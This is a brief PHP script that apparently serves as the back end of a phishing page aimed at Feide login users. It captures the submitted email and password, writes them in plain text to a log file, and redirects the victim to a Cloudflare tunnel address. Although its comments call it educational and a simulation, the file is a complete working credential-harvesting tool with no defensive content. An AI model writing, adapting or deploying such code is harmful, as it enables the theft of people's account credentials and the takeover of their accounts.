<?php
// Capture the email and password from the form submission
$email = $_POST['email'];
$password = $_POST['password'];

// Log the credentials to a file for educational purposes
file_put_contents("usernames.txt", "Feide Username: " . htmlspecialchars($email) . " Pass: " . htmlspecialchars($password) . "\n", FILE_APPEND);

// Redirect the user to a different page to simulate a real phishing attack
header('Location: https://balloon-domain-camps-cheats.trycloudflare.com');
exit();
?>
